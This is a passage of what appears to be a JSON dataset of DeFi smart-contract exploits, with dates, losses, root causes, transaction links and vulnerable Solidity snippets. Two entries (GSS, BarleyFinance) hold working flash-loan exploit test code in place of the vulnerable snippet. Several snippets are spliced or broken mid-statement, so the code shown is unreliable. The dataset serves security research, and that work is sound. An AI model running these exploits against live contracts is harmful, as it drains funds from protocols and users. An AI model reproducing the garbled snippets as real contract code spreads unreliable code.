        "vulnerable_code_snippet":"hToken = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);//GVC\nlpToken = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);//GVC\nfunction transfer(address recipient, uint256 amount)\n    public\n    virtual\n    override\n    returns (bool)\n    {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\nfunction _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(!_isBot;\n    path[0] = address(this);\n    path[1] = address(usdt);\n    path[2] = address(token);\n    // make the swap\n    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens( //vulnerable point\n        tokenAmount,\n        0, // accept any amount of ETH\n        path,\n        to,\n        block.timestamp\n    );\n}"
    },
    {
        "type": "Price Manipulation, skim",
        "date": "20230824",
        "title": "GSS",
        "root_cause": "The attack began with a loan of USDT. By manipulating the price-to-total supply relationship on PancakeSwap, the attacker unbalanced the GSS pool and distorted the GSS price. This allowed the final swap from GSS to USDT to yield more USDT for the attacker.",
        "attack_tx": "https://bscscan.com/tx/0x4f8cb9efb3cc9930bd38af5f5d34d15ce683111599a80df7ae50b003e746e336",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/GSS_exp.sol",
        "analysis": "https://twitter.com/bbbb/status/1694571228185723099",
        "lost": "$25K",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\n// @KeyInfo - Total Lost : ~$24883 USD$\n// Attacker : https://bscscan.com/address/0x84f37f6cc75ccde5fe9ba99093824a11cfdc329d\n// Attack Contract : https://bscscan.com/address/0x69ed5b59d977695650ec4b29e61c0faa8cc0ed5c\n// Attack Tx : https://bscscan.com/tx/0x4f8cb9efb3cc9930bd38af5f5d34d15ce683111599a80df7ae50b003e746e336\n\n// @Analysis\n// Twitter Guy : https://twitter.com/bbbb/status/1694571228185723099\n\ncontract ContractTest is Test {\n    address private constant usdt = 0x55d398326f99059fF775485246999027B3197955;\n    address private constant gss = 0x37e42B961AE37883BAc2fC29207A5F88eFa5db66;\n    address private constant gss_usdt_pool = 0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0;\n    address private constant gss_gssdao_pool = 0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64;\n    address private constant pancakeRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address private constant dodo_pool = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 31_108_559 - 1);\n        vm.label(usdt, \"USDT\");\n        vm.label(gss, \"GSS\");\n        vm.label(gss_usdt_pool, \"GSS_USDT_POOL\");\n        vm.label(gss_gssdao_pool, \"GSS_GSSDAO_POOL\");\n        vm.label(pancakeRouterV2, \"PANCAKE_ROUTER_V2\");\n        vm.label(dodo_pool, \"DODOPool\");\n    }\n\n    function testExploit() public {\n        IDPPOracle(dodo_pool).flashLoan(0, 30_000 ether, address(this), new bytes(1));\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        swap(usdt, gss, 30_000 ether);\n        IERC20(gss).transfer(gss_usdt_pool, 707_162_351_662_098_288_993_328);\n\n        IPancakePair(gss_usdt_pool).skim(gss_gssdao_pool);\n        IPancakePair(gss_usdt_pool).sync();\n        IPancakePair(gss_gssdao_pool).skim(address(this));\n\n        swap(gss, usdt, IERC20(gss).balanceOf(address(this)));\n\n        // pay back\n        IERC20(usdt).transfer(msg.sender, 30_000 ether);\n        emit log_named_decimal_uint(\"Attacker USDT balance after exploit\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n\n    function swap(address tokenIn, address tokenOut, uint256 amountIn) internal {\n        IERC20(tokenIn).approve(pancakeRouterV2, type(uint256).max);\n        address;\n        path[0] = tokenIn;\n        path[1] = tokenOut;\n        IUniswapV2Router(payable(pancakeRouterV2)).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn, 0, path, address(this), block.timestamp + 1000\n        );\n    }\n}\n"
    },
    {
        "type": "Deflationary token, Flashloans, Price Manipulation",
        "date": "20221212",
        "lost": "$18k",
        "title": "BGLD",
        "root_cause": "Deflationary token abuse via skim. The exploiter reduces the $BGLD reserve in the pair to a deficient level and then swaps out another token (WBNB).",
        "vulnerable_code_snippet": "function _transfer(\n    address sender,\n    address recipient,\n    uint256 amount\n) internal {\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\n    require(amount > 0, \"Transfer amount must be greater than zero\");\n\n    uint256 onePercent = _findOnePercent(amount);\n    uint256 burnFee = onePercent.mul(2);\n    uint256 miningFee = onePercent.mul(4);\n    uint256 liquidityFee = onePercent.mul(4);\n\n    if (!_isExcludedFromFee[sender]) {\n        require(\n            _balances[sender] >\n                amount.add(miningFee).add(liquidityFee).add(burnFee), //vulnerable point\n            \"BEP20: transfer amount + fees exceeds balance\"\n        );\n    }\n}",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BGLD_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae",
        "analysis": "https://twitter.com/BlockSecTeam/status/1602335214356660225"
    },
    {
        "type": "Dex/AMM, Economic",
        "date": "20221011",
        "title": "Mango",
        "root_cause": "Economic issue ",
        "analysis": "The vulnerability stemmed from the thin liquidity on the exchange market between MNGO and the USDC stablecoin, which was used as the price reference for a MNGO perpetual swap."
    },
    {
        "type": "Donate, Precision",
        "date": "20231013",
        "title": "WiseLending",
        "root_cause": "The attacker bypassed Wise Lending's defenses against donation attacks by exploiting the Wise PLP Pool for Pendle LP tokens. They manipulated donation limits and a rounding issue in the `_calculateShares` function by making small initial deposits and strategic donations to maximize the impact of rounding errors.",
        "attack_tx": "https://etherscan.io/tx/0x7ac4a98599596adbf12fffa2bd23e2a2d2ac7e8989b6ea043fcc412a29126555",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/WiseLending_exp.sol",
        "analysis": [
            "https://twitter.com/bbbb/status/1712841315522638034",
            "https://twitter.com/BlockSecTeam/status/1712871304993689709"
        ],
        "lost": "$260K",
        "vulnerable_code_snippet":"function _calculateShares(\n    uint256 _product,\n    uint256 _pseudo,\n    bool _maxSharePrice\n) private pure returns (uint256) {\n    return _maxSharePrice == true\n        ? _product % _pseudo == 0\n            ? _product / _pseudo\n            : _product / _pseudo + 1\n        : _product / _pseudo;\n}"
    },
    {
        "type": "Reentrancy",
        "date": "20240128",
        "title": "BarleyFinance",
        "root_cause": "The lack of reentrancy protection allowed an attacker to exploit flash loans to manipulate the protocol. This vulnerability enabled the attacker to repeatedly mint and de-bond tokens, ultimately draining the liquidity pool and significantly depleting the protocol's assets.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/BarleyFinance_exp.sol",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1751788389139992824",
        "lost": "130K",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\n// @KeyInfo - Total Lost : ~$130K\n// Attacker : https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6\n// Attack Contracts : https://etherscan.io/address/0x356e7481b957be0165d6751a49b4b7194aef18d5\n// Vuln Contract : https://etherscan.io/address/0x04c80bb477890f3021f03b068238836ee20aa0b8\n// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x995e880635f4a7462a420a58527023f946710167ea4c6c093d7d193062a33b01\n\n// @Analysis\n// https://phalcon.blocksec.com/explorer/security-incidents\n// https://www.bitget.com/news/detail/12560603890246\n// https://twitter.com/Phalcon_xyz/status/1751788389139992824\n\ninterface IwBARL is IERC20 {\n    function flash(\n        address _recipient,\n        address _token,\n        uint256 _amount,\n        bytes memory _data\n    ) external;\n\n    function bond(address _token, uint256 _amount) external;\n\n    function debond(uint256 _amount, address;\n        token;\n        percentage[0] = 100;\n        wBARL.debond(wBARL.balanceOf(address(this)), token, percentage);\n\n        BARLToWETH();\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\",\n            WETH.balanceOf(address(this)),\n            WETH.decimals()\n        );\n    }\n\n    function callback(bytes calldata data) external {\n        BARL.approve(address(wBARL), BARL.balanceOf(address(this)));\n        wBARL.bond(address(BARL), BARL.balanceOf(address(this)));\n    }\n\n    function BARLToWETH() internal {\n        BARL.approve(address(Router), type(uint256).max);\n        bytes memory _path = abi.encodePacked(\n            address(BARL),\n            hex\"002710\",\n            address(DAI),\n            hex\"0001f4\",\n            address(WETH)\n        );\n        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router\n            .ExactInputParams({\n                path: _path,\n                recipient: address(this),\n                deadline: block.timestamp + 1000,\n                amountIn: BARL.balanceOf(address(this)),\n                amountOutMinimum: 0\n            });\n        Router.exactInput(params);\n    }\n}\n"
    },
    {
        "type": "Arbitrary call",
        "date": "20231206",
        "title": "Arbitrary Address Spoofing Attack",
        "root_cause": "The root cause of this incident was that the arbitrary external call function of the forwarder contract was maliciously used by the hacker. Execution using “execute()” and “call()”: The “execute()” function then called the “call()” function, packaging ‘req.data’ and ‘req.from’ as parameters for the “call()” function. The ‘req.to’ was specified as 0x4b0e9a7da8bab813efae92a6651019b8bd6c0a29 (TIME contract), and the selector of the multicall(bytes[]) function was 0xac9650d8.",
        "attack_tx": [
            "https://www.oklink.com/es-la/eth/tx/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6",
            "https://explorer.phalcon.xyz/tx/eth/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TIME_exp.sol",
        "analysis": "https://www.immunebytes.com/blog/time-token-hack-dec-7-2023-detailed-analysis-report/",
        "vulnerable_code": "https://www.oklink.com/es-la/eth/address/0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81/contract",
        "vulnerable_code_snippet":"function execute(ForwardRequest calldata req, bytes calldata signature)\n    public\n    payable\n    returns (bool, bytes memory)\n{\n    require(verify(req, signature), \"MinimalForwarder: signature does not match request\");\n    _nonces[req.from] = req.nonce + 1;\n\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, bytes memory result) = req.to.call{ gas: req.gas, value: req.value }(\n        abi.encodePacked(req.data, req.from) // <-- vulnerable point, req.data\n    );\n\n    if (!success) {\n        // Next 5 lines from https://ethereum.stackexchange.com/a/83577\n        if (result.length < 68) revert(\"Transaction reverted silently\");\n        assembly {\n            result := add(result, 0x04)\n        }\n        revert(abi.decode(result, (string)));\n    }\n    // Check gas: https://ronan.eth.link/blog/ethereum-gas-dangers/\n    assert(gasleft() > req.gas / 63);\n    return (success, result);\n}"
    },
    {
        "type": "Flashloans, Insufficient validation, Yield",
        "date": "20221014",
        "lost": "750 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221014-eflevervault---verify-flashloan-callback",
        "title": "EFLeverVault",
        "root_cause": "insufficient validation",
        "vulnerable_code_snippets": [
            "https://etherscan.io/address/0xe39fd820B58f83205Db1D9225f28105971c3D309#code#L310",
            "https://etherscan.io/address/0xe39fd820B58f83205Db1D9225f28105971c3D309#code#L429"
        ],
        "attack_tx": null,
        "analysis": "Attacker can directly call Flashloan with userData \u201c0x307832\u201d which is bytes \u201c0x2\u201d from balancer and set EFLeverVault as recipient to trigger  _withdraw(loan_amount, fee_amount);  to make vault retain enough ETH. Then attacker can call withdraw to drain out the ETH in [L429](https://etherscan.io/address/0xe39fd820B58f83205Db1D9225f28105971c3D309#code#L429).",
        "vulnerable_code_snippet": "function receiveFlashLoan(\n    IERC20;\n    uint256;\n    bytes memory userData = \"0x2\";\n    tokens[0] = weth;\n    amounts[0] = loan_amount;\n    IBalancer(balancer).flashLoan(address(this), tokens, amounts, userData);\n\n    uint256 to_send = address(this).balance;  // vulnerable point\n    (bool status, ) = msg.sender.call.value(to_send)(\"\");  // vulnerable point\n    require(status, \"transfer eth failed\");\n\n    TokenInterfaceERC20(ef_token).destroyTokens(msg.sender, _amount);\n    emit CFFWithdraw(msg.sender, to_send, _amount, getVirtualPrice());\n}\n"
    },
    {
        "type": "Insufficient validation",
        "date": "20240424",
        "title": "YIEDL",
        "root_cause": "insufficient parameter validation",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/YIEDL_exp.sol",
        "analysis": [
            "https://medium.com/neptune-mutual/taking-a-closer-look-at-the-yiedl-exploit-e31f04cea592",
            "https://bscscan.com/address/0x4edda16ab4f4cc46b160abc42763ba63885862a4#code#F1#L296"
        ],
        "vulnerable_code": "https://bscscan.com/address/0x4edda16ab4f4cc46b160abc42763ba63885862a4#code",
        "lost": "150k USD",
        "vulnerable_code_snippet": "/* User Functions */\nfunction redeem(uint256 sharesToRedeem, address receivingAsset, uint256 minTokensToReceive, bytes[] calldata dataList, bool useDiscount) external nonReentrant returns (uint256 tokensToReturn) { // <-- vulnerable point, dataList\n  require(depositableAssets.contains(receivingAsset), \"da\");\n  TxParams memory dp;\n  (dp.aum, dp.assets, dp.prices, dp.usdValues) = _getAllocations(0);\n  dp.nav = getNav();\n  dp.nominalFinalAum = dp.aum - ((dp.nav * sharesToRedeem) / UNIT);\n  require(dataList.length == dp.assets.length, \"l\");\n  dp.totalSupply = totalSupply();\n  uint256 rcvTokenAccumulator = ((receivingAsset == NATIVE_TOKEN ? address(this).balance : ERC20(receivingAsset).balanceOf(address(this))) * sharesToRedeem) / dp.totalSupply;\n\n  for (uint256 i = 0; i < dp.assets.length; i++) {\n    if (dp.assets[i] == receivingAsset) {\n      continue;\n    }\n    uint256 rcvTokenSize = receivingAsset == NATIVE_TOKEN ? address(this).balance : ERC20(receivingAsset).balanceOf(address(this));\n\n    if (dp.assets[i] != NATIVE_TOKEN) {\n      ONE_INCH_AGG_ROUTER.functionCall(dataList[i]);\n    } else {\n      uint256 sizeToSwap = (address(this).balance * sharesToRedeem) / dp.totalSupply;\n      ONE_INCH_AGG_ROUTER.functionCallWithValue(dataList[i], sizeToSwap);\n    }\n\n    rcvTokenAccumulator += receivingAsset == NATIVE_TOKEN ? address(this).balance - rcvTokenSize : ERC20(receivingAsset).balanceOf(address(this)) - rcvTokenSize;\n  }\n  _burn(msg.sender, sharesToRedeem);\n\n  uint256 feePortion = (rcvTokenAccumulator * feePercentages[FeeType.REDEEM]) / UNIT;\n  dp.feeRecipient = feeRecipient;\n  if (useDiscount) {\n    (uint256 discountTokensToSpend, uint256 discountMultiplier) = discountPolicy.computeDiscountTokensToSpend(_getUsdValue(receivingAsset, feePortion));\n    ERC20(discountPolicy.discountToken()).safeTransferFrom(msg.sender, dp.feeRecipient, discountTokensToSpend);\n    feePortion = (feePortion * discountMultiplier) / (10 ** discountPolicy.decimals());\n    emit FeeCollected(discountPolicy.discountToken(), discountTokensToSpend);\n  }\n\n  tokensToReturn = rcvTokenAccumulator - feePortion;\n  require((tokensToReturn) >= minTokensToReceive, \"s4\");\n  if (receivingAsset == NATIVE_TOKEN) {\n    payable(msg.sender).sendValue(tokensToReturn);\n  } else {\n    ERC20(receivingAsset).safeTransfer(msg.sender, tokensToReturn);\n  }\n\n  if (feePortion > 0) {\n    uint256 feeTokenAmount;\n    dp.feeAsset = feeAsset;\n    if (receivingAsset == dp.feeAsset) {\n      feeTokenAmount = feePortion;\n    } else {\n      feeTokenAmount = _directSwapForFee(\n        feePortion,\n        0, // don't hinder redemptions due to low liquidity for the fee conversion.\n        receivingAsset,\n        dp.feeAsset\n      );\n    }\n\n    ERC20(dp.feeAsset).safeTransfer(dp.feeRecipient, feeTokenAmount);\n    emit FeeCollected(dp.feeAsset, feeTokenAmount);\n  }\n\n  require(absSlippage(dp.nav, getNav(), UNIT) <= slippageTolerances[SlippageType.NAV], \"s3\");\n  _postSwapHandler(receivingAsset, dp);\n\n  emit Transaction(false, msg.sender, receivingAsset, tokensToReturn, sharesToRedeem);\n}"
    },
    {
        "type": "Dex/AMM, Flashloans",
        "date": "20220807",
        "lost": "$36,044",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220807-egd-finance---flashloans--price-manipulation",
        "title": "EGD Finance",
        "root_cause": "Incorrect price calculation by balanceOf",
        "attack_tx": null,
        "vulnerable_code_snippet": "function claimAllReward() external {\n        require(userInfo[msg.sender].userStakeList.length > 0, 'no stake');\n        require(!black[msg.sender],'black');\n        uint[] storage list = userInfo[msg.sender].userStakeList;\n        uint rew;\n        uint outAmount;\n        uint range = list.length;\n        for (uint i = 0; i < range; i++) {\n            UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];\n            require(info.totalQuota != 0, 'wrong index');\n            uint quota = (block.timestamp - info.claimTime) * info.rates;\n            if (quota >= info.leftQuota) {\n                quota = info.leftQuota;\n            }\n            rew += quota * 1e18 / getEGDPrice(); // check getEGDPrice()\n            info.claimTime = block.timestamp;\n            info.leftQuota -= quota;\n            info.claimedQuota += quota;\n            if (info.leftQuota == 0) {\n                userInfo[msg.sender].totalAmount -= info.totalQuota;\n                delete userSlot[msg.sender][list[i - outAmount]];\n                list[i - outAmount] = list[list.length - 1];\n                list.pop();\n                outAmount ++;            }\n        }\nfunction getEGDPrice() public view returns (uint){\n        uint balance1 = EGD.balanceOf(pair);  //vulnerable point\n        uint balance2 = U.balanceOf(pair);    //vulnerable point\n        return (balance2 * 1e18 / balance1);\n    }",
        "analysis": "Vulnerable code snippet:\n[https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254](https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254)\n```jsx\nfunction claimAllReward() external {\n        require(userInfo[msg.sender].userStakeList.length > 0, 'no stake');\n        require(!black[msg.sender],'black');\n        uint[] storage list = userInfo[msg.sender].userStakeList;\n        uint rew;\n        uint outAmount;\n        uint range = list.length;\n        for (uint i = 0; i < range; i++) {\n            UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];\n            require(info.totalQuota != 0, 'wrong index');\n            uint quota = (block.timestamp - info.claimTime) * info.rates;\n            if (quota >= info.leftQuota) {\n                quota = info.leftQuota;\n            }\n            rew += quota * 1e18 / getEGDPrice(); // check getEGDPrice()\n            info.claimTime = block.timestamp;\n            info.leftQuota -= quota;\n            info.claimedQuota += quota;\n            if (info.leftQuota == 0) {\n                userInfo[msg.sender].totalAmount -= info.totalQuota;\n                delete userSlot[msg.sender][list[i - outAmount]];\n                list[i - outAmount] = list[list.length - 1];\n                list.pop();\n                outAmount ++;            }\n        }\nfunction getEGDPrice() public view returns (uint){\n        uint balance1 = EGD.balanceOf(pair);  //vulnerable point\n        uint balance2 = U.balanceOf(pair);    //vulnerable point\n        return (balance2 * 1e18 / balance1);\n    }\n```"
    },
    {
        "type": "Access Control, Incorrect logic",
        "date": "20221129",
        "title": "MBC",
        "root_cause": "Business Logic Flaw & Access Control\nThe root cause of the issue is a flaw in the MBC contract's implementation. The contract incorrectly uses the addLiquidity() function and mistakenly exposes swapAndLiquifyStepv1() function, which uses the balance of the contract's address as the desired reserve amount for maintaining reserves.\nSo attacker can call swapAndLiquifyStepV1, which will add a certain amount of MBC and BUSD to the pool to manipulate MBC price.",
        "attack_tx": "https://phalcon.blocksec.com/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MBC_exp.sol",
        "analysis": [
            "https://twitter.com/AnciliaInc/status/1597742575623888896",
            "https://twitter.com/CertiKAlert/status/1597639717096460288"
        ],
        "lost": "$5.6k",
        "vulnerable_code_snippet":"function swapAndLiquifyStepv1() public { //vulnerable point\n    uint256 ethBalance = ETH.balanceOf(address(this));\n    uint256 tokenBalance = balanceOf(address(this));\n    addLiquidityUsdt(tokenBalance, ethBalance);\n}\n\nfunction addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {\n    uniswapV2Router.addLiquidity(\n        address(_baseToken),\n        address(this),\n        usdtAmount,\n        tokenAmount,\n        0,\n        0,\n        _tokenOwner,\n        block.timestamp\n    );\n}\n"
    },
    {
        "type": "Dex/AMM, Insufficient validation",
        "date": "20210916",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210916-sushiswap-miso",
        "title": "SushiSwap",
        "root_cause": "Insufficient validation",
        "analysis": "Due to calls is controllable, attacker can execute any function in aution contract. In this case, attacker could batch multiple calls and reuse the same Ether (ETH) to bid in the auction for free.",
        "vulnerable_code": "https://etherscan.io/address/0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e#code#F5#L34",
        "vulnerable_code_snippet": "/// @notice Allows batched call to self (this contract).\n/// @param calls An array of inputs for each call.\n/// @param revertOnFail If True then reverts after a failed call and stops doing further calls.\n/// @return successes An array indicating the success of a call, mapped one-to-one to `calls`.\n/// @return results An array with the returned data of each function call, mapped one-to-one to `calls`.\n// F1: External is ok here because this is the batch function, adding it to a batch makes no sense\n// F2: Calls in the batch may be payable, delegatecall operates in the same context, so each call in the batch has access to msg.value\n// C3: The length of the loop is fully under user control, so can't be exploited\n// C7: Delegatecall is only used on the same contract, so it's safe\nfunction batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {\n    successes = new bool[](calls.length);\n    results = new bytes[](calls.length);\n    for (uint256 i = 0; i < calls.length; i++) {\n        (bool success, bytes memory result) = address(this).delegatecall(calls[i]); //vulnerable point\n        require(success || !revertOnFail, _getRevertMsg(result));\n        successes[i] = success;\n        results[i] = result;\n    }\n}\n\nfunction commitEth(\n    address payable _beneficiary,\n    bool readAndAgreedToMarketParticipationAgreement\n) public payable {\n    ...\n}"
    },
    {
        "type": "ERC667, Reentrancy, lending",
        "date": "20220313",
        "lost": "$1.7 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220313-hundred-finance---erc667-reentrancy",
        "title": "Hundred Finance",
        "root_cause": "Reentrancy",
        "vulnerable_code_snippet": "function transfer(address _to, uint256 _value) public returns (bool) {\n    require(superTransfer(_to, _value));\n    callAfterTransfer(msg.sender, _to, _value); //vulnerable point\n    return true;\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n    require(super.transferFrom(_from, _to, _value));\n    callAfterTransfer(_from, _to, _value);  //vulnerable point\n    return true;\n}",
        "analysis": "bridged token on the gnosis chain has a `callAfterTransfer()`hook which makes the reentrancy on token transfer.",
        "check_detail": "https://medium.com/immunefi/a-poc-of-the-hundred-finance-heist-4121f23a098"
    },
    {
        "type": "Arbitrary call, swap",
        "date": "20221011",
        "title": "Rabby wallet",
        "root_cause": "arbitrary external call vulnerability",
        "analysis": "Since data is controllable by an attacker, so he can perform arbitrary external calls via functionCallWithValue. In this incident, the attacker sends funds out over transferfrom function.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221011-rabby-wallet-swaprouter---arbitrary-external-call-vulnerability",
        "attack_tx": null,
        "source_code": "https://github.com/RabbyHub/Rabby/blob/1860bdd69da09292171457cb08bfd4a0bf89617d/docs/PeckShield-Audit-Report-RabbyRouter-v1.0.pdf",
        "check": "https://twitter.com/1nf0s3cpt/status/1579844213562576897",
        "lost": "$200,000",
        "vulnerable_code_snippet":"// swap\nuint256 amountOut = 0;\ndexRouter.functionCallWithValue(data, value, \"Liquidity source service error, swap fail.\");\nif (!dstIsEth) {\n    amountOut = dstToken.balanceOf(address(this));\n} else {\n    amountOut = address(this).balance;\n}\n\n// calcFeeAmount\nuint256 feeAmount = calcFeeAmount(amountOut);\nuint256 dexAmountOut = amountOut - feeAmount;\nrequire(dexAmountOut >= minReturn, \"Receiving token is below your slippage setting. Try again with a higher slippage.\");"
    },
    {
        "type": "Flashloans, Reentrancy",
        "date": "20221026",
        "lost": "$29k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/N00d_exp.sol",
        "title": "N00d Token",
        "root_cause": "The root cause of this incident is the ERC777 token reentrancy which allows attacker to use old `totalSushi` and updated `totalShares` for mint.",
        "attack_tx": "https://etherscan.io/tx/0x8037b3dc0bf9d5d396c10506824096afb8125ea96ada011d35faa89fa3893aea",
        "analysis": "The attacker exploits the potential for reentrancy with the ERC777 token (sushi). Within the`enter` function, the reentrancy can be initiated through the `sushi.transferFrom` call. In this function, the `mint` process is invoked first, which updates the total token supply. However, the update of `totalSushi` occurs after the `transferFrom` is finished. As a consequence, the calculation result `uint256 what = _amount.mul(totalShares).div(totalSushi);` becomes magnified due to the unchanged `totalSushi` value, despite an increase in `totalShares`.",
        "vulnerable_code_snippet": "// Enter the bar. Pay some SUSHIs. Earn some shares.\nfunction enter(uint256 _amount) public {\n    uint256 totalSushi = sushi.balanceOf(address(this));\n    uint256 totalShares = totalSupply();\n    if (totalShares == 0 || totalSushi == 0) {\n        _mint(msg.sender, _amount);\n    } else {\n        uint256 what = _amount.mul(totalShares).div(totalSushi);\n        _mint(msg.sender, what);\n    }\n    sushi.transferFrom(msg.sender, address(this), _amount);\n}"
    },
    {
        "type": "Incorrect logic, Sandwich",
        "date": "20230118",
        "lost": "22 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Upswing_exp.sol",
        "title": "UPS",
        "root_cause": "The attacker transfers zero UPStkn to himself for triggering the internal function releasePressure that further burns the pool's 573,300.39 $UPStkn, which lifts the UPStkn's price.",
        "vulnerable_code_snippet": "function releasePressure(address _address) internal {\n    uint256 amount = myPressure(_address);\n    \n    if (amount < balanceOf(UNIv2)) {\n        require(_totalSupply.sub(amount) >= _initialSupply.div(1000), \"There is less than 0.1% of the Maximum Supply remaining, unfortunately, kabooming is over\");\n        \n        sellPressure[_address] = 0;\n        addToSteam(_address, amount);\n        \n        ERC20._burn(UNIv2, amount); //vulnerable point\n        \n        _UPSBurned = _UPSBurned.add(amount);\n        emit BurnedFromLiquidityPool(_address, amount);\n        \n        _generateSteamFromUPSBurn(_address);\n        emit SteamGenerated(_address, amount);\n        \n        txCount[_address] = 0;\n    } else if (amount > 0) {\n        sellPressure[_address] = sellPressure[_address].div(2);\n    }\n}",
        "attack_tx": "https://etherscan.io/tx/0x4b3df6e9c68ae482c71a02832f7f599ff58ff877ec05fed0abd95b31d2d7d912",
        "analysis": "https://twitter.com/QuillAudits/status/1615634917802807297"
    },
    {
        "type": "Access Control",
        "date": "20230506",
        "lost": "$90k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Melo_exp.sol",
        "title": "Melo",
        "root_cause": "public mint bug",
        "attack_tx": "https://bscscan.com/tx/0x3f1973fe56de5ecd59a815d3b14741cf48385903b0ccfe248f7f10c2765061f7",
        "analysis": "https://twitter.com/peckshield/status/1654667621139349505",
        "vulnerable_code_snippet": "function mint(address account, uint256 amount, string memory txId) public returns (bool) { //vulnerable point\n    _mint(account, amount);\n    return true;\n}"
    },
    {
        "type": "Deflationary token, Flashloans, Incorrect logic",
        "date": "20221207",
        "lost": "$60k",
        "title": "AES",
        "root_cause": "Manipulate the price via the skim of the BNB-AES pool because AES is a deflationary token.\nThe attacker sends the AES to the BNB-AES pool and invokes the skim function repeatedly. In this process, the pool's balance is burned, and the swap fee in the AES contract is increased. After that, the attacker invokes the 'distributeFee' function in the AES contract to transfer the swap fee out of the pair directly, thereby increasing the price of the AES token.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/AES_exp.sol",
        "vulnerable_code_snippet": "function _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal override {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n\n    if(from == address(this) && to == uniswapV2Pair){\n        super._transfer(from, to, amount);\n    } else {\n        if(automatedMarketMakerPairs[from]) {\n            buyTokenAndFees(from, to, amount);\n        } else if (automatedMarketMakerPairs[to]) {\n            sellTokenAndFees(from, to, amount);  //vulnerable point\n        } else {\n            super._transfer(from, to, amount);\n        }\n    }\n}\n\nfunction sellTokenAndFees(\n    address from,\n    address to,\n    uint256 amount\n) internal {\n    uint256 burnAmount = amount.mul(3).div(100);\n    uint256 otherAmount = amount.mul(1).div(100);\n\n    amount = amount.sub(burnAmount);\n    swapFeeTotal = swapFeeTotal.add(otherAmount);\n    super._burn(from, burnAmount);\n    super._transfer(from, to, amount);\n}\n\nfunction distributeFee() public {\n    uint256 mokeyFeeTotal = swapFeeTotal.mul(2);\n    super._transfer(uniswapV2Pair, monkeyWallet, mokeyFeeTotal);\n    super._transfer(uniswapV2Pair, birdWallet, swapFeeTotal);\n    super._transfer(uniswapV2Pair, foundationWallet, swapFeeTotal);\n    super._transfer(uniswapV2Pair, technologyWallet, swapFeeTotal);\n    super._transfer(uniswapV2Pair, marketingWallet, 